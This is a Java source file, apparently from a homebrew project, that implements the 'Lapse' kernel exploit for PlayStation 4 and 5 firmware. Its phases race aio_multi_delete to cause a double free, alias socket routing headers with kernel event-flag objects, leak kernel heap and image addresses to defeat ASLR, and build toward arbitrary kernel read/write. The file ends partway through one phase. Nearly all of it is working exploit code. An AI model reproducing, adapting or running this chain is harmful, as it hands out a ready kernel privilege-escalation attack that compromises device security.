// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2025 anonymous - Lapse
// Copyright (C) 2025 Kimari - Java port

package org.bdj.lapse;

/* Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20) disclosed by an anonymous
 * developer ("abc") in 2025. Credit goes to abc for the proof-of-concept, Al-Azif for lapse.mjs,
 * and shahrilnet and znull_ptr for lapse.lua. BlueLapse primarily references the latter.
 *
 * https://www.psdevwiki.com/ps4/Vulnerabilities#FW_5.00-12.02_-_Double_free_due_to_aio_multi_delete()_improper_locking
 * https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
 * https://github.com/Al-Azif/psfree-lapse/blob/main/src/lapse.mjs
 *
 * Any code in BlueLapse based on work from lapse.lua or lapse.mjs is available under the GNU Affero
 * General Public License. See the LICENSE file in the repository root for details.
 */

import org.bdj.Console;
import org.bdj.api.API;
import org.bdj.api.Buffer;
import org.bdj.lapse.LibKernel.PthreadBarrier;
import org.bdj.lapse.LibKernel.AioErrorArray;
import org.bdj.lapse.LibKernel.AioRWRequestArray;
import org.bdj.lapse.LibKernel.AioSubmitId;
import org.bdj.lapse.LibKernel.AioSubmitIdArray;
import org.bdj.lapse.LibKernel.Evf;
import org.bdj.lapse.LibKernel.Socket;
import org.bdj.lapse.LibKernel.SocketAddress;
import org.bdj.lapse.LibKernel.ThreadPriority;
import org.bdj.lapse.Library.SystemCallFailed;

public class Lapse extends Thread {
	public final LibKernel k;
	public final API api;
	public final LibC c;

	public Lapse(LibKernel libkernel) {
		k = libkernel;
		api = k.api;
		c = k.libc;
	}

	/** Each phase of the exploit should either succeed or raise an exception */
	public class Phase {
		public void run() throws Throwable {}
		public void cleanup() {}
		protected boolean enableLogging = true;
		protected void log(String s)    { if (enableLogging) { Console.log(s); } }
		protected void log(Throwable t) { if (enableLogging) { Console.log(t); } }
	}

	public void run() {
		try {
			CoreSetup      coreSetup      = new CoreSetup();
			BlockWorkers   blockWorkers   = new BlockWorkers();
			GroomHeap      groomHeap      = new GroomHeap();
			DoubleFree     doubleFree     = new DoubleFree();
			AliasRthdrs    aliasRthdrs    = new AliasRthdrs();
			DeletePrevReqs deletePrevReqs = new DeletePrevReqs();
			AliasEvfRthdr  aliasEvfRthdr  = new AliasEvfRthdr();
			BreakASLR      breakASLR      = new BreakASLR();
			LeakAioEntry   leakAioEntry   = new LeakAioEntry();
			AliasAioRthdr  aliasAioRthdr  = new AliasAioRthdr();
			MakeKernelRW   makeKernelRW   = new MakeKernelRW();

			try {
				// Core setup
				coreSetup.run();

				if (SINGLECORE) {
					// Block AIO workers from processing requests
					// FIXME: Experimental, to match lapse.mjs/lua behavior more precisely
					blockWorkers.run();
				}

				// FIXME: Let's just not do this and see how it goes
				// Heap grooming
				// groomHeap.run();

				// Double-free AIO queue entry
				doubleFree.run();

				// Retrieve pair of sockets with aliased rthdr structs
				aliasRthdrs.run();

				// Delete AIO requests created by DoubleFree
				// FIXME: Experimental, to match lapse.mjs/lua behavior more precisely
				deletePrevReqs.inIds = doubleFree.outIds;
				deletePrevReqs.run();

				// Alias evf and rthdr
				aliasEvfRthdr.inSocketA = aliasRthdrs.outSocketA;
				aliasEvfRthdr.inSocketB = aliasRthdrs.outSocketB;
				aliasEvfRthdr.run();

				// Leak kernel addresses
				breakASLR.inEvf = aliasEvfRthdr.outEvf;
				breakASLR.inSocket = aliasEvfRthdr.outSocket;
				breakASLR.run();

				// Leak aio_entry
				leakAioEntry.inSocket = aliasEvfRthdr.outSocket;
				leakAioEntry.inKernelHeapAddr = breakASLR.outKernelHeapAddr;
				leakAioEntry.inKernelImageAddr = breakASLR.outKernelImageAddr;
				leakAioEntry.run();

				// Double-free SceKernelAioRWRequest/alias with evf
				aliasAioRthdr.inoutSockets = aliasRthdrs.outSockets;
				aliasAioRthdr.inEvf = aliasEvfRthdr.outEvf;
				aliasAioRthdr.inSocket = aliasEvfRthdr.outSocket;
				aliasAioRthdr.inAioEntryAddr = leakAioEntry.outAioEntryAddr;
				aliasAioRthdr.inKernelHeapAddr = breakASLR.outKernelHeapAddr;
				aliasAioRthdr.inAioTargetId = leakAioEntry.outAioTargetId;
				aliasAioRthdr.run();

				// Get arbitrary kernel read/write
				makeKernelRW.inoutSockets = aliasAioRthdr.inoutSockets;
				makeKernelRW.inAioEntryAddr = leakAioEntry.outAioEntryAddr;
				makeKernelRW.inKernelImageAddr = breakASLR.outKernelImageAddr;
				makeKernelRW.inSocketA = aliasAioRthdr.outSocketA;
				makeKernelRW.inSocketB = aliasAioRthdr.outSocketA;
				makeKernelRW.inDirtySocket = aliasAioRthdr.outSocket;
				makeKernelRW.run();

				// Patch kernel

			} catch (Throwable e) {
				Console.log(e);
			} finally {
				coreSetup     .cleanup();
				blockWorkers  .cleanup();
				groomHeap     .cleanup();
				doubleFree    .cleanup();
				aliasRthdrs   .cleanup();
				deletePrevReqs.cleanup();
				aliasEvfRthdr .cleanup();
				breakASLR     .cleanup();
				leakAioEntry  .cleanup();
				aliasAioRthdr .cleanup();
				makeKernelRW  .cleanup();
			}
		} catch (Throwable e) {
			Console.log(e);
		}
	}

	// FIXME: Experimental, has yet to work as intended
	public static final boolean SINGLECORE = false;
	public static final boolean SET_AFFINITY = SINGLECORE ? true : false;
	public static final boolean SET_PRIORITY = SINGLECORE ? true : false;

	private class CoreSetup extends Phase {
		public static final int MAIN_THREAD_CORE = 4;
		public static final int RACE_THREAD_CORE = SINGLECORE ? 4 : 3;

		private int restoreAffinity;
		private ThreadPriority restorePriority;

		public void run() throws Throwable {
			// This was added in the hopes that it might make things more reliable, but no such luck
			if (SET_AFFINITY) {
				restoreAffinity = k.cpuGetAffinityForCurrentThread();
				k.cpuSetAffinityForCurrentThread(1 << MAIN_THREAD_CORE);
			}
			if (SET_PRIORITY) {
				restorePriority = k.cpuGetPriorityForCurrentThread();
				k.cpuSetPriorityForCurrentThread(new ThreadPriority(LibKernel.PRI_REALTIME, 0x100));
			}
		}

		public void cleanup() {
			if (SET_AFFINITY) { k.cpuSetAffinityForCurrentThread(restoreAffinity); }
			if (SET_PRIORITY) { k.cpuSetPriorityForCurrentThread(restorePriority); }
		}
	}

	private class BlockWorkers extends Phase {
		private final int NUM_WORKERS = 2;
		private AioSubmitIdArray ids = null;
		private Socket fds[] = null;

		public void run() throws Throwable {
			log("BlockWorkers: blocking AIO worker threads");

			AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_WORKERS);
			ids = k.new AioSubmitIdArray(NUM_WORKERS);
			fds = k.socketPair(LibKernel.AF_UNIX, LibKernel.SOCK_STREAM);

			for (int i = 0; i < NUM_WORKERS; i++) {
				reqs.get(i).nbyte.set(1);
				reqs.get(i).fd.set(fds[0].fd);
			}

			k.aioSubmitCmd(LibKernel.AIO_CMD_READ, reqs, ids);
		}

		public void cleanup() {
			if (ids != null) {
				k.aioMultiWait(ids, null, LibKernel.AIO_WAIT_AND);
				k.aioMultiDelete(ids, null);
			}
			if (fds != null) {
				fds[0].close();
				fds[1].close();
			}
		}
	}


	private class GroomHeap extends Phase {
		// Allocate enough so that we start allocating from a newly created slab
		public final int NUM_GROOMS = 512;
		public final int NUM_REQS_PER_GROOM = 3;

		public void run() throws Throwable {
			log("Heap grooming: " + NUM_GROOMS + " * " + NUM_REQS_PER_GROOM + " reqs");

			AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_REQS_PER_GROOM);
			AioSubmitIdArray ids = k.new AioSubmitIdArray(NUM_GROOMS * NUM_REQS_PER_GROOM);
			reqs.initMinimal();

			for (int i = 0; i < NUM_GROOMS; i++) {
				int idCount = NUM_REQS_PER_GROOM, idOffset = i * idCount;
				k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_READ, reqs, ids.slice(idOffset, idCount));
			}

			k.aioUtilBatchCancel(ids, null);
		}
	}

	private class DoubleFree extends Phase {
		// FIXME: Experimental, to match lapse.mjs/lua behavior more precisely
		public AioSubmitIdArray outIds = null;

		private AioSubmitIdArray cleanupIds = null;

		private void setCleanupIds(AioSubmitIdArray src, int excludeIndex) {
			cleanupIds = null;
			if (src != null) {
				cleanupIds = k.new AioSubmitIdArray(src.count - 1);
				for (int i = 0, j = 0; i < cleanupIds.count; i++) {
					if (j == excludeIndex) continue;
					cleanupIds.set(i, src.get(j++).get());
				}
			}
		}
		private void setCleanupIds(AioSubmitIdArray src) {
			setCleanupIds(src, -1);
		}

		private class MultiDeleteThread extends Thread {
			public Buffer outThreadId;
			public PthreadBarrier inoutBarrier;
			public AioSubmitIdArray inIds;
			public AioErrorArray inoutErr;

			public void run() {
				try {
					if (SET_AFFINITY) {
						k.cpuSetAffinityForCurrentThread(1 << CoreSetup.RACE_THREAD_CORE);
					}
					if (SET_PRIORITY) {
						k.cpuSetPriorityForCurrentThread(
							new ThreadPriority(LibKernel.PRI_REALTIME, 0x100));
					}
					outThreadId.putLong(0, k.cpuGetCurrentThreadId());
					long pids = inIds.address();
					long nids = inIds.count;
					long perr = inoutErr.address();
					inoutBarrier.barrierWait();
					// k.aioMultiDelete(inIds, inoutErr);
					long r = k.SYS_aio_multi_delete.call(pids, nids, perr);
					if (r != 0) {
						throw new SystemCallFailed("aio_multi_delete", k.errno(), c);
					}
				} catch (Throwable e) {
					log("MultiDeleteThread: exception encountered:");
					log(e);
				}
			}
		}

		public void run() throws Throwable {
			final int NUM_FREE_ATTEMPTS = 10000;
			final int NUM_REQS = 3;
			final int TARGET_REQ = NUM_REQS - 1;

			AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_REQS);
			AioSubmitIdArray  ids  = k.new AioSubmitIdArray (NUM_REQS);
			reqs.initMinimal();

			AioSubmitIdArray targetIds = ids.slice(TARGET_REQ, 1);
			PthreadBarrier barrier = k.new PthreadBarrier(2);

			// lapse.mjs/lua do some kind of socket/suspend/yield nonsense to work around the lack
			// of multithreading in their runtime environments. We don't have that problem here but
			// my way is just resulting in an unreliable exploit. Maybe this will be better?
			SocketAddress address = k.new SocketAddress(LibKernel.AF_INET, 5050, 127, 0, 0, 1);
			Socket listen = k.new Socket(LibKernel.AF_INET, LibKernel.SOCK_STREAM, 0);
			if (SINGLECORE) {
				listen.setReuseAddr(true);
				listen.bind(address);
				listen.listen(1);
			}

			boolean successful = false;
			for (int attempt = 0; attempt < NUM_FREE_ATTEMPTS; attempt++) {
				log("DoubleFree: attempt " + attempt + " of " + NUM_FREE_ATTEMPTS);

				// FIXME: Touching the console during this loop makes panics MUCH more likely
				// To be fair the console is kind of a clown car operation and every log call does
				// various kinds of JVM thread synchronization nonsense. It should really be fixed.
				enableLogging = false;

				Socket client, connection;
				if (SINGLECORE) {
					client = k.new Socket(LibKernel.AF_INET, LibKernel.SOCK_STREAM, 0);
					client.connect(address);
					connection = listen.accept();
					log("-> socket connected: fd " + connection.fd);
				}

				reqs.initMinimal();
				if (SINGLECORE) {
					// We want aio_multi_delete (on the worker thread) to call soclose() on the fd
					reqs.get(TARGET_REQ).fd.set(connection.fd);
					// We'll force soclose() to sleep by setting SO_LINGER
					connection.setLinger(true, 1);
				}

				// Command and priority do not matter but the MULTI flag is required
				log("-> calling aio_submit_cmd");
				k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_READ, reqs, ids);

				log("-> new request ids: " + ids.toString());
				setCleanupIds(ids);

				// You cannot delete any request that is already being processed by a SceFastAIO
				// worker thread. We just wait on them instead of polling and checking whether a
				// request is being processed. Polling is also error-prone since the request can
				// become out of date.
				// NOTE: This bit is taken from abc's PoC, lapse.mjs/lua are slightly different.
				// Not sure if their version is more reliable? Maybe it is for single-core?
				// log("-> calling aio_multi_wait");
				// k.aioMultiWait(ids, null, LibKernel.AIO_WAIT_AND);

				// This is what lapse.mjs/lua do:
				log("-> calling aio_multi_cancel");
				k.aioMultiCancel(ids, null);
				log("-> calling aio_multi_poll");
				k.aioMultiPoll(ids, null);

				if (SINGLECORE) {
					// Drop the reference so that aio_multi_delete will trigger _fdrop
					log("-> closing connection");
					connection.close();
				}

				AioErrorArray mainErr = k.new AioErrorArray(1);
				AioErrorArray raceErr = k.new AioErrorArray(1);

				// Indicate that we shouldn't clean up the target request
				// FIXME: Not sure this is actually needed, or the correct thing to do.
				// Is there even a way to make the exploit fail safe if the next step fails?
				setCleanupIds(ids, TARGET_REQ);

				log("-> starting MultiDeleteThread for " + targetIds);

				MultiDeleteThread racer = new MultiDeleteThread();
				racer.outThreadId = new Buffer(8);
				racer.inoutBarrier = barrier;
				racer.inIds = targetIds;
				racer.inoutErr = raceErr;
				racer.start();

				log("-> waiting for thread to be ready");
				k.waitUntilNotEqualLong(racer.outThreadId, 0, 0, 1, 1000);
				long racerThreadId = racer.outThreadId.getLong(0);

				boolean issuedDelete = false;

				log("-> thread id is " + racerThreadId + "; waiting for barrier");

				long pids = targetIds.address();
				long nids = targetIds.count;
				long perr = mainErr.address();

				barrier.barrierWait(); // enter barrier as last waiter, hopefully (in SINGLECORE)

				if (SINGLECORE) {
					log("-> yield");
					k.yield(); // hope scheduler calls racer next

					// racer should now be in soclose, suspend so it doesn't finish
					long r = k.SYS_thr_suspend_ucontext.call(racerThreadId);
					log("-> thread suspended; ret " + r + " errno " + k.errno());

					try {
						AioErrorArray pollResultBuf = k.new AioErrorArray(1);
						k.aioMultiPoll(targetIds, pollResultBuf);

						int pollResult = pollResultBuf.get(0).get();
						log("-> aio_multi_poll result: 0x" + Integer.toHexString(pollResult));

						int tcpState = connection.getTCPState();
						log("-> connection TCP state:  0x" + Integer.toHexString(tcpState));

						if (pollResult != LibKernel.SCE_KERNEL_ERROR_ESRCH &&
							tcpState != LibKernel.TCPS_ESTABLISHED)
						{
							// We can now call aio_multi_delete and hopefully trigger the double-free,
							// since the other thread is stuck inside aio_multi_delete as well
							// PANIC: This call will make the system vulnerable to a kernel panic:
							// Double free on the 0x80 malloc zone. Important kernel data may alias.
							log("-> calling aio_multi_delete");
							// k.aioMultiDelete(targetIds, mainErr);
							r = k.SYS_aio_multi_delete.call(pids, nids, perr);
							if (r != 0) {
								throw new SystemCallFailed("aio_multi_delete", k.errno(), c);
							}
							issuedDelete = true;
						}
					} catch (Exception e) {
						enableLogging = true; // FIXME
						log("DoubleFree: error in main thread aio_multi_delete section:");
						log(e);
						issuedDelete = false;
					} finally {
						log("-> closing connection");
						connection.close();
						log("-> resuming and waiting for thread");
						k.SYS_thr_resume_ucontext.call(racerThreadId);
						racer.join();
					}
				}

				if (!SINGLECORE) {
					// Don't do anything else, we have a race condition to win
					k.aioMultiDelete(targetIds, mainErr);
					issuedDelete = true;

					log("-> waiting for thread");
					racer.join();
				}

				enableLogging = true; // FIXME

				if (issuedDelete) {
					int mainErrCode = mainErr.get(0).get();
					String mainErrCodeHex = Integer.toHexString(mainErrCode);
					log("-> main thread aio_multi_delete: error 0x" + mainErrCodeHex);

					int raceErrCode = raceErr.get(0).get();
					String raceErrCodeHex = Integer.toHexString(raceErrCode);
					log("-> race thread aio_multi_delete: error 0x" + raceErrCodeHex);

					// The race is successful if both error codes are 0
					if (mainErrCode == 0 && raceErrCode == 0) {
						successful = true;
						outIds = ids;
						break;
					}
				}

				if (successful) {
					listen.close();
					break;
				}

				// Clean up so multiple failed runs don't result in running out of aio handles
				// FIXME: Remove in case this is what's making the exploit even worse than usual
				// cleanup();
			}

			if (!successful) {
				throw new Exception("Couldn't double-free an AIO queue entry");
			}

			// Are we supposed to clean up now? It's not super clear why lapse.mjs calls
			// aio_multi_delete *after* make_aliased_rthdrs. Could be important or could be an
			// incidental detail? I'll just defer cleanup until the end and see what happens.
		}

		public void cleanup() {
			log("DoubleFree: deleting " + cleanupIds.count + " leftover requests");
			try {
				k.aioUtilBatchCancelPollDelete(cleanupIds);
			} catch (Throwable e) {
				// Something else may have deleted these requests?
				log(e);
			}
			cleanupIds = null;
		}
	}

	private class AliasRthdrs extends Phase {
		/** Pair of sockets with aliased ip6_rthdr structs in kernel memory */
		public Socket outSocketA, outSocketB;

		private final int MALLOC_SIZE = 0x80;
		private final int RTHDR_LEN = ((MALLOC_SIZE >> 3) - 1) & ~1;
		private final int RTHDR_SIZE = (RTHDR_LEN + 1) << 3;
		private Buffer rthdrTemplate = new Buffer(RTHDR_SIZE);

		/** Sockets array that every step reuses, sds in lapse.mjs */
		public Socket outSockets[] = null;
		private final int NUM_SOCKETS = 64; // num_sds in lapse.mjs

		public AliasRthdrs() {
			// IPV6_RTHDR (routing header) options struct for setsockopt, build_rthdr in lapse.mjs
			// FIXME: Would be nice to have a BufferLike class that mirrors the rthdr structure
			rthdrTemplate.putByte(0, (byte)0);                // ip6r_next
			rthdrTemplate.putByte(1, (byte)RTHDR_LEN);        // ip6r_len
			rthdrTemplate.putByte(2, (byte)0);                // ip6r_type
			rthdrTemplate.putByte(3, (byte)(RTHDR_LEN >> 1)); // ip6r_segleft

			// Allocated here because DoubleFree induces a PANIC state that AliasRthdrs.run needs
			// to RESTORE, and creating sockets involves syscalls and kernel memory allocation
			outSockets = new Socket[NUM_SOCKETS];
			for (int i = 0; i < outSockets.length; i++) {
				outSockets[i] = k.new SocketUDP6();
			}
		}

		public void run() throws Throwable {
			final int NUM_ALIAS_ATTEMPTS = 1000;
			final int MARKER_OFFSET = 4;
			Buffer buf = new Buffer(MALLOC_SIZE);

			for (int aliasAttempt = 0; aliasAttempt < NUM_ALIAS_ATTEMPTS; aliasAttempt++) {
				log("AliasRthdr: attempt " + aliasAttempt);

				for (int i = 0; i < outSockets.length; i++) {
					rthdrTemplate.putInt(MARKER_OFFSET, i);

					// FIXME: I don't really get this bit of the exploit. lapse.mjs has these
					// comments on the call to make_aliased_rthdrs, but surely the reclamation
					// happens later, when we next call aioMultiDelete? Or does that call's
					// RESTORE comment correspond to the PANIC comment on this one?
					// RESTORE: Reclaim double-freed memory with harmless data(?)
					// PANIC: 0x80 malloc zone pointers aliased(?)
					outSockets[i].setRthdr(rthdrTemplate);
				}

				for (int i = 0; i < NUM_SOCKETS; i++) {
					outSockets[i].getRthdr(buf);
					int m = buf.getInt(MARKER_OFFSET);
					if (m == i) {
						// No corruption occurred for this rthdr, can ignore it
						continue;
					}
					outSocketA = outSockets[i]; outSockets[i] = k.new SocketUDP6();
					outSocketB = outSockets[m]; outSockets[m] = k.new SocketUDP6();
					break; // done
				}

				if (outSocketA != null) break; // done
			}

			if (outSocketA == null) {
				throw new Exception("Couldn't construct aliasing rthdr structs");
			}

			log("-> aliased rthdrs on sockets " + outSocketA.fd + "/" + outSocketB.fd);
		}

		public void cleanup() {
			outSocketA.close();
			outSocketB.close();
			for (int i = 0; i < outSockets.length; i++) {
				outSockets[i].close();
			}
		}
	}

	private class DeletePrevReqs extends Phase {
		public AioSubmitIdArray inIds;

		public void run() throws Throwable {
			log("DeletePrevReqs: deleting: " + inIds);
			// Comment from lapse.mjs:
			// MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
			// twice. this will leave one request undeleted
			k.aioMultiDelete(inIds, null);
		}
	}

	private class AliasEvfRthdr extends Phase {
		/** Pair of sockets with aliased ip6_rthdr structs in kernel memory */
		public Socket inSocketA, inSocketB;

		/** Socket with ip6_rthdr struct aliased with outEvf's kernel memory */
		public Socket outSocket;
		/** Handle of evf struct aliased with outSocket's ip6_rthdr in kernel memory */
		public Evf outEvf;

		Evf evfs[] = null;

		public void run() throws Throwable {
			outSocket = inSocketA;

			// PANIC/MEMLEAK?
			inSocketB.close();

			final int NUM_CONFUSION_ATTEMPTS = 100;
			final int MALLOC_SIZE = 0x80;
			final int NUM_EVFS = 256;

			Buffer buf = new Buffer(MALLOC_SIZE);

			boolean successful = false;
			for (int attempt = 0; attempt < NUM_CONFUSION_ATTEMPTS; attempt++) {
				log("AliasEvfRthdr: attempt " + attempt);

				evfs = new Evf[NUM_EVFS];
				for (int i = 0; i < evfs.length; i++) {
					// Flags must be set to >= 0xf00 to fully leak contents of rthdr
					// i << 16 is used as a marker below
					int flags = 0xf00 | (i << 16);
					evfs[i] = k.new Evf(0, flags);
				}

				// rthdr should now be aliased with kernel memory for one of the evfs, so if we
				// read from it we should see one of our flag|marker dwords
				outSocket.getRthdr(buf.slice(0, MALLOC_SIZE));
				int flags2 = buf.getInt(0);
				int evfidx = flags2 >> 16;
				log("-> read 0x" + Integer.toHexString(flags2) + " (idx " + evfidx + ")");
				if (evfidx > NUM_EVFS) {
					continue; // try again
				}
				outEvf = evfs[evfidx]; // will just be zero if unsuccessful

				// Check if this is the right evf by writing something through the evf API and
				// reading it back through getsockopt
				int modified = flags2 | 1;
				outEvf.set(modified);
				outSocket.getRthdr(buf.slice(0, MALLOC_SIZE));
				int readback = buf.getInt(0);
				log("-> set  0x" + Integer.toHexString(modified));
				log("-> read 0x" + Integer.toHexString(readback));
				if (readback != modified) {
					cleanupEvfs();
					continue; // try again
				}

				// outEvf's evf struct now aliases outSocketA's rthdr struct
				evfs[evfidx] = null; // prevent it from being cleaned up
				log("-> evf " + outEvf.id + " aliases rthdr of socket " + outSocket.fd);

				successful = true;
				break;
			}

			if (!successful) {
				throw new Exception("Couldn't construct aliasing evf/rthdr pair");
			}

			cleanupEvfs(); // can free other evfs now
		}

		public void cleanup() {
			cleanupEvfs();
			if (outEvf != null) { outEvf.delete(); }
		}

		private void cleanupEvfs() {
			if (evfs == null) return;
			log("AliasEvfRthdr: closing " + evfs.length + " evfs");
			for (int i = 0; i < evfs.length; i++) {
				if (evfs[i] == null) continue;
				evfs[i].delete();
			}
			evfs = null;
		}
	}

	private class BreakASLR extends Phase {
		/** Socket with ip6_rthdr struct aliased with inEvf's kernel memory */
		public Socket inSocket;
		/** Handle of evf struct aliased with inSocket's ip6_rthdr in kernel memory */
		public Evf inEvf;

		/** Address inside kernel image of "evf cv" string */
		public long outKernelImageAddr;
		/** Address inside kernel heap of inEvf backing struct */
		public long outKernelHeapAddr;

		public void run() throws Throwable {
			// Structure of evf as documented by lapse.mjs:
			//  offset 0x0:  u64 flags
			//  offset 0x28: struct cv cv - first field is char* cv_description, always "evf cv"
			//  ^ this points to an address in the kernel image
			//  offset 0x38: TAILQ_HEAD(struct evf_waiter) waiters - ???
			//  ^ this points to an address in the kernel heap (?)

			// Structure of ip6_rthdr, honestly not sure where this is documented:
			//  offset 0x0: ip6r_next
			//  offset 0x1: ip6r_len
			//  offset 0x2: ip6r_type
			//  offset 0x3: ip6r_segleft

			// Enlarge the rthdr by writing to its len field via the evf flags field
			inEvf.set(0xff << 8);

			// We can then leak the full contents of the evf struct
			final int MALLOC_SIZE = 0x80;
			final int LEAK_LEN = 16; // in MALLOC_SIZE blocks
			final int LEAK_SIZE = MALLOC_SIZE * LEAK_LEN; // overallocated? this is 2048 bytes
			Buffer buf = new Buffer(LEAK_SIZE);
			log("BreakASLR: leaking evf struct via getsockopt");
			inSocket.getRthdr(buf);
			log(hexdump(buf, "-> "));

			// Get the address of the "evf cv" string
			outKernelImageAddr = buf.getLong(0x28);

			// From lapse.mjs: because of TAILQ_INIT(), we have:
			//  evf.waiters.tqh_last == &evf.waiters.tqh_first
			// We now know the address of the kernel buffer we are leaking
			outKernelHeapAddr = buf.getLong(0x40) - 0x38;

			log("BreakASLR: kernel image address: 0x" + Console.hex(outKernelImageAddr));
			log("BreakASLR: kernel heap  address: 0x" + Console.hex(outKernelHeapAddr));
		}
	}

	class LeakAioEntry extends Phase {
		public long inKernelImageAddr;
		public long inKernelHeapAddr;
		public Socket inSocket;

		public long outAioEntryAddr;
		public AioSubmitIdArray outAioTargetId;

		private AioSubmitIdArray ids = null;

		public void run() throws Throwable {
			// FIXME: These comments are just copy-pasted from lapse.mjs, fix them up
			// 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
			// allocate reqs1 arrays at 0x100 malloc zone
			final int NUM_ELEMS = 6;
			// use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of the reqs2 so
			// so crfree(ai_cred) will harmlessly decrement the .ar2_ticket field
			long ucred = inKernelHeapAddr + 4;

			// FIXME: In lapse.mjs this is the same constant used for NUM_EVFS here
			// Move to global scope? But I don't yet understand why lapse.mjs uses it here.
			final int NUM_HANDLES = 256;

			AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_ELEMS);
			ids = k.new AioSubmitIdArray(NUM_HANDLES * NUM_ELEMS);
			reqs.initMinimal();

			// FIXME: Same as in BreakASLR, move to global scope?
			final int MALLOC_SIZE = 0x80;
			final int LEAK_LEN = 16; // in MALLOC_SIZE blocks
			final int LEAK_SIZE = MALLOC_SIZE * LEAK_LEN; // overallocated? this is 2048 bytes
			Buffer buf = new Buffer(LEAK_SIZE);

			final int NUM_ATTEMPTS = 20; // FIXME: lapse.mjs does 6
			int reqs2Offset = 0;
			for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
				log("LeakAioEntry: attempt " + attempt);

				inSocket.getRthdr(buf);

				// spray_aio (note lapse.mjs specifically uses WRITE here, not sure if it matters)
				for (int i = 0; i < NUM_HANDLES; i++) {
					AioSubmitIdArray batchIds = ids.slice(i * NUM_HANDLES, NUM_HANDLES);
					k.aioSubmitCmd(k.AIO_CMD_MULTI_WRITE, reqs, batchIds);
				}

				inSocket.getRthdr(buf);

				boolean verified = false;
				int offset = 0;
				for (int i = 0; i < buf.size(); i += 0x80) {
					// lapse.mjs calls this entire block verify_reqs2
					// FIXME: move into a utility function maybe?
					if (buf.getInt(i) != LibKernel.AIO_CMD_WRITE) {
						continue; // try verify_reqs2 with another offset
					}
					// We're looking for kernel heap addresses, which are prefixed with 0xffff_xxxx
					// with xxxx randomized on boot
					short heapPrefix = 0;
					// Check if offsets 0x10 to 0x20 look like a kernel heap address
					boolean found = false;
					for (int j = 0x10; j <= 0x20; j += 8) {
						if (buf.getShort(i + j + 6) != 0xffff) {
							found = false; // can stop looking
							break;
						}
						heapPrefix = buf.getShort(i + j + 4);
						found = true;
					}
					if (!found) {
						continue; // try verify_reqs2 with another offset
					}
					// Check reqs2.ar2_result.state. It's a 32-bit value but the allocated memory
					// was initialized with zeroes so all padding bytes must be 0.
					int state = buf.getInt(i + 0x38);
					int padding = buf.getInt(i + 0x38 + 4);
					if (!(0 < state && state <= 4) || padding != 0) {
						continue; // try verify_reqs2 with another offset
					}
					// Check reqs2.ar2_file, must be NULL since we passed a bad fd to aio_submit_cmd
					long file = buf.getLong(i + 0x40);
					if (file != 0) {
						continue; // try verify_reqs2 with another offset
					}
					// Check if offsets 0x48 to 0x50 look like a kernel address
					found = false;
					for (int j = 0x48; j <= 0x50; j += 8) {
						if (buf.getShort(i + j + 6) == 0xffff) {
							// Ignore kernel ELF addresses
							if (buf.getShort(i + j + 4) != 0xffff) {
								if (buf.getShort(i + j + 4) == heapPrefix) {
									found = true;
								}
							}
							// offset 0x48 can be NULL
						} else if (i == 0x50 || buf.getLong(i + j) != 0) {
							found = false;
							break; // can stop looking
						}
					}
					if (!found) {
						continue; // try verify_reqs2 with another offset
					}
					verified = true;
					offset = i;
					break;
				}

				k.aioUtilBatchCancelPollDelete(ids);

				if (verified) {
					outAioEntryAddr = buf.address() + offset;
					reqs2Offset = offset;
					log("-> reqs2 offset " + offset + " addr 0x" + Console.hex(outAioEntryAddr));
					break;
				}
			}

			Console.log("-> looking for target_id");

			for (int i = 0; i < ids.count; i += NUM_ELEMS) {
				k.aioMultiCancel(ids.slice(i, NUM_ELEMS), null);

				inSocket.getRthdr(buf);

				int state = buf.getInt(reqs2Offset + 0x38);
				if (state != k.AIO_STATE_ABORTED) {
					continue; // not the one we're looking for
				}

				Console.log("-> found target_id in batch " + i / NUM_ELEMS);
				outAioTargetId = ids.slice(i, 1);
				ids.set(i, 0); // prevent it from getting deleted
				break;
			}

			cleanup();
		}

		public void cleanup() {
			if (ids != null) {
				k.aioUtilBatchCancelPollDelete(ids);
			}
		}
	}

	class AliasAioRthdr extends Phase {
		/** Sockets array that every step reuses, sds in lapse.mjs */
		public Socket inoutSockets[] = null;

		public Evf inEvf;
		public Socket inSocket;
		public long inKernelHeapAddr;
		public long inKernelImageAddr;
		public long inAioEntryAddr;
		public AioSubmitIdArray inAioTargetId;

		public Socket outSocket;  // sd in lapse.mjs, unrelated to pair(?)
		public Socket outSocketA; // sd_pair[0] in lapse.mjs
		public Socket outSocketB; // sd_pair[1] in lapse.mjs

		public void run() throws Throwable {
			final int MAX_LEAK_LEN = (0xff + 1) << 3; // FIXME: why?
			Buffer buf = new Buffer(MAX_LEAK_LEN);

			final int NUM_ELEMS = LibKernel.MAX_AIO_IDS;
			final int NUM_BATCHES = 2;
			AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_ELEMS);
			AioSubmitIdArray ids = k.new AioSubmitIdArray(NUM_BATCHES * NUM_ELEMS);
			reqs.initMinimal();

			final int NUM_ATTEMPTS = 100; // FIXME: lapse.mjs sets this to 8 (num_clobbers)
			boolean successful = false;

			for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
				log("AliasAioRthdr: overwrite rthdr with AIO queue entry: attempt " + attempt);

				// spray_aio
				for (int i = 0; i < NUM_BATCHES; i++) {
					AioSubmitIdArray batchIds = ids.slice(i * NUM_BATCHES, NUM_BATCHES);
					k.aioSubmitCmd(k.AIO_CMD_MULTI_READ, reqs, batchIds);
				}

				int written = inSocket.getRthdr(buf);
				if (written == 8 && buf.getInt(0) == k.AIO_CMD_READ) {
					log("-> aliased");
					successful = true;
					k.aioUtilBatchCancel(ids, null);
					break;
				}

				k.aioUtilBatchCancelPollDelete(ids);
			}

			if (!successful) {
				throw new Exception("Couldn't overwrite rthdr with AIO queue entry");
			}

			final int MALLOC_SIZE = 0x80;
			Buffer reqs2 = new Buffer(MALLOC_SIZE);

